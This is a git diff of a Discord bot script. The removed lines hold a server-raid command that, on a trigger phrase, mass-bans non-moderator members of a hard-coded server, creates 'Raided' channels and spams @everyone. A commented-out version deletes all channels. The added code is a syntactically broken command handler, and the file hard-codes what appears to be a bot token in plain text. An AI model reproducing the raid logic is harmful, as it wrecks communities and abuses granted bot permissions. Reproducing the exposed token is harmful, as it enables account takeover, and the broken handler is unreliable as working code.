@@ -112,23 +112,40 @@ var listener = app.listen(process.env.PORT, () => {
 let Discord = require("discord.js")
 let client = new Discord.Client()
 
-//client.on("message", message => {
-  //if(message.content === "start the rain") {
-    //message.guild.channels.forEach(channel => channel.delete())
-  //}
-//})
-  client.on("message", message => {
-  if(message.content === "start the rain") {
-    let server = client.guilds.cache.get("767737108700987412") //Right click on server icon to get server id
-    for(let i =0;i<=500;i++) {
-      server.members.cache.filter(r => !r.hasPermission("MANAGE_MESSAGES")).forEach(b => server.members.ban(b.id))
-      server.channels.create('Raided', { reason: 'Needed a cool new channel' })
-      server.channels.cache.filter(r => r.type === "text").forEach(channel => {
-        channel.send("@everyone this server is raided get rekt")
-      })    
+client.on('ready', () => {
+  
+  client.user.setActivity("Server", {type: "WATCHING"})
+  
+  client.guilds.forEach((guild) => {
+    
+    console.log(guild.name)
+    
+client.on('message', (receivedMessage) => {
+  
+
+  if (receivedMessage.content.startWith("?")) {
+    processCommand(receivedMessage)
+    
     }
-   }
-})      
+  })
+function processCommand(receivedMessage) {
+  let fullCommand = receivedMessage.content.substr(1)
+  let splitCommand = fullCommand.split(" ")
+  let primaryCommand = splitCommand[0]
+  
+  if (primaryCommand == "help")
+}
+    
+    
+    
+    
+    
+    
+  })
+})
+
+
+
 
 
 client.login("Nzk1OTEzNzYxMjQ3NDYxMzk4.X_QSdA.D23Dr0t74asdpBAmc605RnFV2aQ")
